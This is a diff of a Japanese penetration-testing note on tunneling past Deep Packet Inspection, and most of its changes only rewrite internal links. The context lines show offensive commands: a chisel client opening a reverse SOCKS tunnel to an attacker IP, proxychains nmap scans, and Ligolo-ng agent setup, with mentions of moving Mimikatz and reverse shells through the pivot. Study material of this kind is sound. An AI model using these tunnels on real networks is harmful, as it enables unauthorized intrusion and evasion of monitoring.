@@ -1,15 +1,15 @@
 - 関連ノート：
-	- [[Port Redirection & SSH Port Forwarding]]
-	- [[53 - DNS]]
+	- [Port Redirection & SSH Port Forwarding](Port%20Redirection%20&%20SSH%20Port%20Forwarding.md)
+	- [53 - DNS](../../Ports%20-%20Service/53%20-%20DNS.md)
 
 ---
 # 前提知識：Deep Packet Inspection(DPI)とは
 
 - ルールベースでトラフィックを監視するための技術で、侵害を示すパターンを指定しておく
-- これにより、外向けのSSHトラフィックを遮断され、[[Port Redirection & SSH Port Forwarding]]が失敗することがある
+- これにより、外向けのSSHトラフィックを遮断され、[Port Redirection & SSH Port Forwarding](Port%20Redirection%20&%20SSH%20Port%20Forwarding.md)が失敗することがある
 - Deep Packet Inspectionを回避するために...
-	- HTTP通信が許可されているとき：[[#HTTP Tunneling]]
-	- DNS通信が許可されているとき：[[#DNS Tunneling]]
+	- HTTP通信が許可されているとき：[Tunneling Through Deep Packet Inspection](Tunneling%20Through%20Deep%20Packet%20Inspection.md#HTTP%20Tunneling)
+	- DNS通信が許可されているとき：[Tunneling Through Deep Packet Inspection](Tunneling%20Through%20Deep%20Packet%20Inspection.md#DNS%20Tunneling)
 
 ---
 ---
@@ -68,21 +68,21 @@ chisel client <attacker_IP>:<バインドポート> R:<dest_port>:<dest_IP>:<des
 ```
 - `R:`：dest_IPに127.0.0.1と指定すれば、ターゲットのローカルサービスへアクセスできる
 - 一方で、ポート番号ではなく`socks`と指定すれば、1080番ポートにSOCKSプロキシを立て、Dynamic Port Forwardingが可能になる
-- `> /dev/null 2>&1 &`：[[スクリプト・コマンド・シェル操作#シェル(`sh`系)の特殊記号一覧表]]
+- `> /dev/null 2>&1 &`：[スクリプト・コマンド・シェル操作](../../Common/スクリプト・コマンド・シェル操作.md#シェル(`sh`系)の特殊記号一覧表)
 
 6. 成功すればchisel server(攻撃者マシン)に以下のように表示される
 ```
 2025/09/27 12:41:59 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
 ```
 - また`tcpdump`にも"Websocket"の文字列が確認できる
-	- →失敗したとき：[[スクリプト・コマンド・シェル操作#コマンドが動作しない原因を突き止める]]
+	- →失敗したとき：[スクリプト・コマンド・シェル操作](../../Common/スクリプト・コマンド・シェル操作.md#コマンドが動作しない原因を突き止める)
 
 7. 目的の操作をする
 ```sh
 # Nmap
 sudo proxychains nmap -sT -p- -Pn -n <TargetIP> [2>/dev/null]
 ```
-- SOCK経由のSSHアクセスの場合：[[22 - SSH#SSHをSOCKSプロキシ経由で動かす]]
+- SOCK経由のSSHアクセスの場合：[22 - SSH](../../Ports%20-%20Service/22%20-%20SSH.md#SSHをSOCKSプロキシ経由で動かす)
 - `proxychains nmap`の速度が遅い場合は、Proxychainsの設定で以下の２つの値を小さくする
 ```zsh
 # Some timeouts in milliseconds
@@ -221,7 +221,7 @@ ligolo-proxy -selfcert -laddr 0.0.0.0:<ListenPort>
 ```
 
 4. [Ligolo-ng relase - GitHub](https://github.com/nicocha30/ligolo-ng/releases)から足場のマシンのアーキテクチャ・プロセッサに合ったagentバイナリをダウンロードし、転送した上で、足場のマシンでAgentを起動する
-	- [[ファイル操作、ユーティリティ#ファイルの転送]]
+	- [ファイル操作、ユーティリティ](../../Common/ファイル操作、ユーティリティ.md#ファイルの転送)
 ```zsh
 # windowsであってもコマンドは一緒(バイナリのパスは環境に合わせて)
 # githubからインストールした場合は./agent...
@@ -289,11 +289,11 @@ ip a show
 
 ### 用途
 
-- 攻撃者 → Agent(足場) → ローカルNW内の他のマシン：[[#Tunneling w/ Ligolo-ng]]
-- ☑️ローカルNW内の他のマシン→攻撃者マシン：[[#Listener]]
+- 攻撃者 → Agent(足場) → ローカルNW内の他のマシン：[Tunneling Through Deep Packet Inspection](Tunneling%20Through%20Deep%20Packet%20Inspection.md#Tunneling%20w/%20Ligolo-ng)
+- ☑️ローカルNW内の他のマシン→攻撃者マシン：[Tunneling Through Deep Packet Inspection](Tunneling%20Through%20Deep%20Packet%20Inspection.md#Listener)
 - <u>ツール転送やSMB接続、リバースシェル等の用途</u>で使う
 	- 例えばローカルNW内のマシンにMimikatzを送りたいとき等
-	- ⚠️以下、[[#Tunneling w/ Ligolo-ng]]のステップ７で`start`としてから実行するものとする
+	- ⚠️以下、[Tunneling Through Deep Packet Inspection](Tunneling%20Through%20Deep%20Packet%20Inspection.md#Tunneling%20w/%20Ligolo-ng)のステップ７で`start`としてから実行するものとする
 
 ### Listenerセットアップ方法
 
